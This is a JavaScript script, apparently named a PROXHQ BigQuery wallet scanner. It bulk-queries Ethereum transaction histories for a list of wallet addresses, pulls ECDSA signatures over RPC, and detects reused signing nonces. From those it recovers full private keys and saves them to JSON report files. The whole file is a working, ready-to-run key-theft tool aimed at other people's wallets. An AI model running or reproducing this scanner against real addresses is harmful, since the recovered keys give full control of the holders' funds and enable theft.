/**
 * BigQuery Full Wallet Scan Runner
 * Reads job-5.txt → BigQuery bulk tx lookup → batch RPC r/s/v → nonce-reuse detection → key recovery
 */
import { BigQuery } from "@google-cloud/bigquery";
import { ethers }   from "ethers";
import fs           from "fs";
import path         from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const WALLETS_FILE = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
const REPORTS_DIR  = "/home/runner/workspace/proxhq-reports/reports/bigquery-scan";
const RPC_URL      = "https://ethereum.publicnode.com";
const CURVE_N      = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const LOG_FILE     = "/home/runner/workspace/proxhq-reports/reports/bigquery-scan.log";

// ── Helpers ───────────────────────────────────────────────────────────────────
function log(...args) {
  const line = `[${new Date().toISOString()}] ${args.join(" ")}`;
  console.log(line);
  try { fs.appendFileSync(LOG_FILE, line + "\n"); } catch {}
}

function modInverse(a, m) {
  let [oldR, r] = [((a % m) + m) % m, m];
  let [oldS, s] = [1n, 0n];
  while (r !== 0n) {
    const q = oldR / r;
    [oldR, r] = [r, oldR - q * r];
    [oldS, s] = [s, oldS - q * s];
  }
  return ((oldS % m) + m) % m;
}

function tryRecoverKey(r, s1, s2, z1, z2, address) {
  const rBig  = BigInt(r);
  const s1Big = BigInt(s1);
  const s2Big = BigInt(s2);
  const z1Big = BigInt(z1);
  const z2Big = BigInt(z2);

  if (z1Big === z2Big && s1Big === s2Big) return null; // identical, skip

  for (const [za, sa, zb, sb] of [[z1Big, s1Big, z2Big, s2Big], [z2Big, s2Big, z1Big, s1Big]]) {
    try {
      const sDiff = ((sa - sb) % CURVE_N + CURVE_N) % CURVE_N;
      if (sDiff === 0n) continue;
      const zDiff = ((za - zb) % CURVE_N + CURVE_N) % CURVE_N;
      const k     = (zDiff * modInverse(sDiff, CURVE_N)) % CURVE_N;
      if (k === 0n) continue;
      const privKey = (sa * k - za) * modInverse(rBig, CURVE_N) % CURVE_N;
      const privKeyMod = ((privKey % CURVE_N) + CURVE_N) % CURVE_N;
      if (privKeyMod === 0n) continue;

      const privHex = "0x" + privKeyMod.toString(16).padStart(64, "0");
      const wallet  = new ethers.Wallet(privHex);
      const matches = wallet.address.toLowerCase() === address.toLowerCase();

      if (matches) {
        log(`🔓 KEY RECOVERED for ${address}: ${privHex.slice(0, 12)}...`);
        return { privHex, wallet: wallet.address, matches };
      }
    } catch {}
  }
  return null;
}

// ── BigQuery ──────────────────────────────────────────────────────────────────
async function runBigQueryJob(bq, sql) {
  // Submit job and poll until complete (no timeout — full table scans take 3-8 min)
  const [job] = await bq.createQueryJob({ query: sql, location: "US", useLegacySql: false });
  log(`BigQuery job submitted: ${job.id} — waiting for completion…`);

  return new Promise((resolve, reject) => {
    const poll = setInterval(async () => {
      try {
        const [meta] = await job.getMetadata();
        const state  = meta.status?.state;
        if (state === "DONE") {
          clearInterval(poll);
          if (meta.status?.errorResult) {
            reject(new Error(meta.status.errorResult.message));
            return;
          }
          const bytesProcessed = meta.statistics?.totalBytesProcessed ?? "?";
          log(`BigQuery job done — bytes processed: ${Number(bytesProcessed).toLocaleString()}`);
          const [rows] = await job.getQueryResults({ maxResults: 10_000_000 });
          resolve(rows);
        } else {
          log(`BigQuery job ${job.id} status: ${state}…`);
        }
      } catch (err) { clearInterval(poll); reject(err); }
    }, 5000); // poll every 5 seconds
  });
}

async function fetchTxHashesBigQuery(addresses) {
  const raw   = process.env.GOOGLE_BIGQUERY_KEY;
  const creds = JSON.parse(raw);
  const bq    = new BigQuery({ projectId: creds.project_id, credentials: creds });

  const lower   = addresses.map(a => a.toLowerCase());
  const addrMap = new Map();
  const CHUNK   = 5000;

  for (let i = 0; i < lower.length; i += CHUNK) {
    const batch = lower.slice(i, i + CHUNK);
    log(`BigQuery: submitting async job for ${batch.length} addresses (offset ${i})…`);

    const addrLiteral = batch.map(a => `'${a}'`).join(",");
    const sql = `
      SELECT from_address, \`hash\`
      FROM \`bigquery-public-data.crypto_ethereum.transactions\`
      WHERE from_address IN (${addrLiteral})
      ORDER BY from_address, block_number, transaction_index
    `;

    const rows = await runBigQueryJob(bq, sql);

    for (const row of rows) {
      const addr = row.from_address.toLowerCase();
      const arr  = addrMap.get(addr) ?? [];
      arr.push(row.hash);
      addrMap.set(addr, arr);
    }
    log(`BigQuery batch done — ${rows.length} rows, ${addrMap.size} distinct addresses so far`);
  }
  return addrMap;
}

// ── Batch RPC ─────────────────────────────────────────────────────────────────
async function batchRpc(hashes) {
  const BATCH = 50;
  const out   = new Array(hashes.length).fill(null);

  for (let i = 0; i < hashes.length; i += BATCH) {
    const slice   = hashes.slice(i, i + BATCH);
    const payload = slice.map((h, idx) => ({
      jsonrpc: "2.0", method: "eth_getTransactionByHash", params: [h], id: i + idx,
    }));
    try {
      const res  = await fetch(RPC_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(30_000),
      });
      const data = await res.json();
      for (const item of data) {
        const li = item.id - i;
        if (li >= 0 && li < slice.length) out[i + li] = item.result ?? null;
      }
    } catch (err) {
      log(`WARN: RPC batch ${i} failed — ${err.message}`);
    }
  }
  return out;
}

// ── z reconstruction ──────────────────────────────────────────────────────────
function reconstructZ(tx) {
  try {
    const txType = parseInt(tx.type ?? "0x0", 16);
    const fields = {
      to: tx.to, nonce: parseInt(tx.nonce, 16),
      gasLimit: BigInt(tx.gas), data: tx.input,
      value: BigInt(tx.value), type: txType,
    };
    if (txType === 2) {
      fields.chainId              = BigInt(tx.chainId ?? "0x1");
      fields.maxFeePerGas         = BigInt(tx.maxFeePerGas ?? "0x0");
      fields.maxPriorityFeePerGas = BigInt(tx.maxPriorityFeePerGas ?? "0x0");
      fields.accessList           = tx.accessList ?? [];
    } else if (txType === 1) {
      fields.chainId    = BigInt(tx.chainId ?? "0x1");
      fields.gasPrice   = BigInt(tx.gasPrice ?? "0x0");
      fields.accessList = tx.accessList ?? [];
    } else {
      fields.gasPrice = BigInt(tx.gasPrice ?? "0x0");
      const chainId   = tx.chainId ? BigInt(tx.chainId) : null;
      if (chainId && chainId > 0n) fields.chainId = chainId;
    }
    const unsigned = ethers.Transaction.from(fields);
    return ethers.keccak256(unsigned.unsignedSerialized);
  } catch {
    return "0x" + "0".repeat(64);
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────
const startTime = Date.now();
fs.mkdirSync(REPORTS_DIR, { recursive: true });

log("═══════════════════════════════════════════════════");
log("  PROXHQ BigQuery Full Wallet Scan — STARTING");
log("═══════════════════════════════════════════════════");

// 1. Load addresses
const addresses = fs.readFileSync(WALLETS_FILE, "utf8")
  .split("\n").map(l => l.trim()).filter(l => l.startsWith("0x"));
log(`Loaded ${addresses.length} wallet addresses from ${WALLETS_FILE}`);

// 2. BigQuery bulk tx hash lookup
log("Step 1/4 — BigQuery bulk tx hash lookup…");
const txMap = await fetchTxHashesBigQuery(addresses);
const totalTxs = [...txMap.values()].reduce((s, v) => s + v.length, 0);
log(`Step 1 complete — ${txMap.size} addresses have txs, ${totalTxs} total tx hashes`);

// 3. Deduplicate and batch RPC
const allHashes = [...new Set([...txMap.values()].flat())];
log(`Step 2/4 — Batch RPC for ${allHashes.length} unique tx hashes (50 per request)…`);
const rawTxs = await batchRpc(allHashes);

// 4. Build signature map
const sigByHash = new Map();
let sigCount = 0;
for (const tx of rawTxs) {
  if (!tx?.r || tx.r === "0x" || tx.r === "0x0") continue;
  const z = reconstructZ(tx);
  sigByHash.set(tx.hash.toLowerCase(), {
    txHash: tx.hash, r: tx.r, s: tx.s,
    v: parseInt(tx.v, 16), z, from: tx.from,
    nonce: parseInt(tx.nonce, 16),
    blockNumber: parseInt(tx.blockNumber ?? "0x0", 16),
    value: ethers.formatEther(BigInt(tx.value)),
  });
  sigCount++;
}
log(`Step 2 complete — ${sigCount} signatures extracted from ${allHashes.length} tx hashes`);

// 5. Nonce-reuse detection + key recovery
log("Step 3/4 — Scanning for shared r-values (nonce reuse)…");
const findings = [];
let scanned = 0;
let totalSharedR = 0;
let keysRecovered = 0;

for (const address of addresses) {
  const lc     = address.toLowerCase();
  const hashes = txMap.get(lc) ?? [];
  const sigs   = hashes.map(h => sigByHash.get(h.toLowerCase())).filter(Boolean);

  if (sigs.length === 0) { scanned++; continue; }

  // Group by r value
  const rGroups = {};
  for (const sig of sigs) {
    const key = sig.r.toLowerCase();
    (rGroups[key] ??= []).push(sig);
  }

  for (const [rVal, group] of Object.entries(rGroups)) {
    if (group.length < 2) continue;
    totalSharedR++;
    log(`⚠️  SHARED R detected: address=${address} r=${rVal.slice(0,14)}… txCount=${group.length}`);

    for (let i = 0; i < group.length; i++) {
      for (let j = i + 1; j < group.length; j++) {
        const t1 = group[i], t2 = group[j];
        const result = tryRecoverKey(t1.r, t1.s, t2.s, t1.z, t2.z, address);

        const finding = {
          address, sharedR: rVal,
          tx1: t1.txHash, tx2: t2.txHash,
          t1_nonce: t1.nonce, t2_nonce: t2.nonce,
          recovered: !!result?.matches,
          privateKey: result?.matches ? result.privHex : null,
        };
        findings.push(finding);

        if (result?.matches) {
          keysRecovered++;
          const outPath = path.join(REPORTS_DIR, `key_${address.slice(2, 10)}.json`);
          fs.writeFileSync(outPath, JSON.stringify(finding, null, 2));
          log(`✅ SAVED KEY RESULT: ${outPath}`);
        }
      }
    }
  }

  scanned++;
  if (scanned % 500 === 0) {
    log(`Progress: ${scanned}/${addresses.length} addresses scanned, ${totalSharedR} shared-r found, ${keysRecovered} keys recovered`);
  }
}

// 6. Save full summary
const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
const summary = {
  completedAt:    new Date().toISOString(),
  elapsedSeconds: parseFloat(elapsed),
  totalAddresses: addresses.length,
  addressesWithTxs: txMap.size,
  totalTxHashes:  totalTxs,
  sigsExtracted:  sigCount,
  sharedRValues:  totalSharedR,
  keysRecovered,
  findings,
};
const summaryPath = path.join(REPORTS_DIR, "summary.json");
fs.writeFileSync(summaryPath, JSON.stringify(summary, null, 2));

log("═══════════════════════════════════════════════════");
log(`  SCAN COMPLETE in ${elapsed}s`);
log(`  Addresses:       ${addresses.length}`);
log(`  With txs:        ${txMap.size}`);
log(`  Tx hashes:       ${totalTxs}`);
log(`  Sigs extracted:  ${sigCount}`);
log(`  Shared r-values: ${totalSharedR}`);
log(`  🔑 Keys recovered: ${keysRecovered}`);
log(`  Summary: ${summaryPath}`);
log("═══════════════════════════════════════════════════");
